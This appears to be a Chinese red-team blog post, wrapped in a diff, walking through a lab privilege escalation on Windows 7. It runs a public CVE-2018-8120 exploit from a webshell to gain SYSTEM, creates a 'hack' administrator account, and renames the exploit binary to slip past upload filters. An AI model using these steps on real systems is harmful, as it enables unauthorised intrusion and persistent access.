@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>Win7本地溢出exploit提权-CVE-2018-8120 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Win7本地溢出exploit提权-CVE-2018-8120</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 7, 2019&nbsp;&nbsp;10:39:30</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1323099451&auto=1&height=66"></iframe>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这边是模拟拿到了一个<code>WebShell</code>的后渗透提权操作</p>
+<h2 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h2><p>首先是看了看一个当前用户权限：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/338.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; whoami</span><br><span class="line"></span><br><span class="line">iis apppool\bjgs_v2.1</span><br></pre></td></tr></table></figure>
+
+<p>是一个<code>IIS</code>的普通权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; net user</span><br><span class="line"></span><br><span class="line">\\ 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    liuwx                    </span><br><span class="line">命令运行完毕，但发生一个或多个错误。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; net user admin admin /add</span><br><span class="line"></span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/339.png" alt="图片"></p>
+<p>创建用户：<code>拒绝访问</code>，那么权限还是比较低的！</p>
+<p>先是上传个<code>大马</code>看看有没有<code>可读可写</code>的目录:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/340.png" alt="图片"></p>
+<p>得到一个目录：</p>
+<blockquote>
+<p>文件夹：C:\inetpub\wwwroot\bjgs_v2.1 可读,可写。</p>
+</blockquote>
+<p>先看看当前主机的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; systeminfo</span><br><span class="line"></span><br><span class="line">主机名:           LIUWX-PC</span><br><span class="line">OS 名称:          Microsoft Windows 7 旗舰版 </span><br><span class="line">OS 版本:          6.1.7601 Service Pack 1 Build 7601</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立工作站</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     liuwx</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00426-292-0000007-85837</span><br><span class="line">初始安装日期:     2019/4/16, 1:03:42</span><br><span class="line">系统启动时间:     2019/10/7, 9:39:32</span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 2 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~3408 Mhz</span><br><span class="line">                  [02]: Intel64 Family 6 Model 158 Stepping 9 GenuineIntel ~3408 Mhz</span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD 6.00, 2017/5/19</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     3,103 MB</span><br><span class="line">可用的物理内存:   1,834 MB</span><br><span class="line">虚拟内存: 最大值: 6,205 MB</span><br><span class="line">虚拟内存: 可用:   4,956 MB</span><br><span class="line">虚拟内存: 使用中: 1,249 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 2 个修补程序。</span><br><span class="line">                  [01]: KB2534111</span><br><span class="line">                  [02]: KB976902</span><br><span class="line">网卡:             安装了 1 个 NIC。</span><br><span class="line">                  [01]: Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">                      连接名:      本地连接</span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line">                      DHCP 服务器: 192.168.1.1</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: 192.168.1.106</span><br><span class="line">                        [02]: fe80::10d5:df24:e351:af59</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/341.png" alt="图片"></p>
+<p>关键信息有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">操作系统是Windows 7 x64</span><br><span class="line"></span><br><span class="line">补丁只打了两个：KB2534111、KB976902</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那么我们就可以上传<code>*.exe</code>本地溢出提权！</p>
+<p>这边是在<code>Github</code>上找到了一个提权<code>exe</code>: <a target="_blank" rel="noopener" href="https://github.com/alpha1ab/CVE-2018-8120">CVE-2018-8120</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-8120 Windows LPE exploit</span><br><span class="line"></span><br><span class="line">测试支持: Win7 x32, Win7 x64, Win2008 x32, Win2008 R2 x32, Win2008 R2 Datacenter x64, Win2008 Enterprise x64 WinXP x32, Win2003 x32,Win2003 x64</span><br><span class="line"></span><br><span class="line">原exp不支持xp，2003，当前代码在原基础上增加了对这两个系统的支持</span><br></pre></td></tr></table></figure>
+
+<p>吧<code>exe</code>上传到<code>可读可写</code>的目录:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/342.png" alt="图片"></p>
+<p>先是使用<code>exe</code>看了看当前权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[*] 磁盘列表 [ C:D: ]</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; whoami</span><br><span class="line">iis apppool\bjgs_v2.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; </span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; CVE-2018-8120.exe &quot;whoami&quot;</span><br><span class="line">CVE-2018-8120 exploit Change by @Topsec_Alpha_lab(https://github.com/alphalab)</span><br><span class="line">[-] Could not load ntkrnlmp.exe , load ntoskrnl.exe instead.</span><br><span class="line">[+] Trying to execute whoami as SYSTEM...</span><br><span class="line">[+] Process created with pid 3132!</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/343.png" alt="图片"></p>
+<p>是一个：<code>nt authority\system</code>系统权限！</p>
+<p>提权命令：（创建一个<code>hack</code>用户并且提升为<code>管理员组</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-8120.exe &quot;net user hack hack /add&quot;</span><br><span class="line"></span><br><span class="line">CVE-2018-8120.exe &quot;net localgroup administrators hack /add&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/344.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; net user</span><br><span class="line"></span><br><span class="line">\\ 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    hack                     </span><br><span class="line">liuwx                    </span><br><span class="line">命令运行完毕，但发生一个或多个错误。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; net user hack</span><br><span class="line">用户名                 hack</span><br><span class="line">全名                   </span><br><span class="line">注释                   </span><br><span class="line">用户的注释             </span><br><span class="line">国家/地区代码          000 (系统默认值)</span><br><span class="line">帐户启用               Yes</span><br><span class="line">帐户到期               从不</span><br><span class="line"></span><br><span class="line">上次设置密码           2019/10/7 11:04:04</span><br><span class="line">密码到期               2019/11/18 11:04:04</span><br><span class="line">密码可更改             2019/10/7 11:04:04</span><br><span class="line">需要密码               Yes</span><br><span class="line">用户可以更改密码       Yes</span><br><span class="line"></span><br><span class="line">允许的工作站           All</span><br><span class="line">登录脚本               </span><br><span class="line">用户配置文件           </span><br><span class="line">主目录                 </span><br><span class="line">上次登录               从不</span><br><span class="line"></span><br><span class="line">可允许的登录小时数     All</span><br><span class="line"></span><br><span class="line">本地组成员             *Administrators       </span><br><span class="line">全局组成员             *None                 </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<p>提权成功！</p>
+<h2 id="番外篇"><a href="#番外篇" class="headerlink" title="番外篇"></a>番外篇</h2><h4 id="二进制文件后缀可任意修改"><a href="#二进制文件后缀可任意修改" class="headerlink" title="二进制文件后缀可任意修改"></a>二进制文件后缀可任意修改</h4><p>首先我们是有一个二进制文件：<code>CVE-2018-8120.exe</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/374.png" alt="图片"></p>
+<p>接着吧<code>exe</code>后缀改成<code>txt</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/375.png" alt="图片"></p>
+<blockquote>
+<p>CVE-2018-8120.txt “whoami”</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; CVE-2018-8120.txt &quot;whoami&quot;</span><br><span class="line">CVE-2018-8120 exploit Change by @Topsec_Alpha_lab(https://github.com/alphalab)</span><br><span class="line">[-] Could not load ntkrnlmp.exe , load ntoskrnl.exe instead.</span><br><span class="line">[+] Trying to execute whoami as SYSTEM...</span><br><span class="line">[+] Process created with pid 2700!</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/376.png" alt="图片"></p>
+<p>可以看到，是可以执行的！</p>
+<p>一般这种用于不能上传<code>exe</code>、<code>bat</code>文件，我们就可以吧<code>exe</code>文件修改为可上传的后缀文件也能照常运行！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/377.png" alt="图片"></p>
+<p>图片格式也是可以的！</p>
+<h4 id="aspx比asp权限大"><a href="#aspx比asp权限大" class="headerlink" title="aspx比asp权限大"></a>aspx比asp权限大</h4><p>如果网站支持<code>aspx</code>脚本，那么有的时候<code>asp</code>的权限比较小，但是上传了<code>aspx</code>脚本后权限就比<code>asp</code>要大一些！</p>
+<p>因为<code>aspx</code>使用的是<code>.net</code>技术。IIS 中默认不支持，<code>ASPX</code>需要依赖于<code>.net framework</code> …ASP只是脚本语言而已。<code>ASP.NET</code>允许用户使用IIS建立网络服务。入侵的时候…<code>asp</code>的木马一般是<code>guest</code>权限…<code>APSX</code>的木马一般是<code>users</code>权限…<code>iis6 </code>默认以<code>network service</code>身份运行。<code>iis5</code>默认是<code>aspnet ASP.NET</code>,<code>IIS</code>的权限机制非常复杂，对每一层应用，都有不同的权限控制。总之..要求对<code>asp.net</code>开放相应权限，才可以让你的网站完成相应的服务。<code>ASP.net</code>程序的访问权限由<code>ASPNET</code>的权限来决定。<code>ASPNET</code>隶属于<code>Users</code>组。所以<code>ASPX</code>权限就要高一些…</p>
+<h4 id="WebSHELL集合"><a href="#WebSHELL集合" class="headerlink" title="WebSHELL集合"></a>WebSHELL集合</h4><p><a target="_blank" rel="noopener" href="https://github.com/tennc/webshell">This is a webshell</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/10/07/red-hack-1/">http://example.com/2019/10/07/red-hack-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"># 后渗透</a>
+                    
+                        <a href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"># 红队攻防</a>
+                    
+                        <a href="/tags/%E6%8F%90%E6%9D%83/"># 提权</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/10/07/red-hack-2/">Windows提权之本地提权-信息搜集</a>
+            
+            
+            <a class="next" rel="next" href="/2019/10/06/SQL-Access-1/">SQL注入学习之 - Access数据库注入原理</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
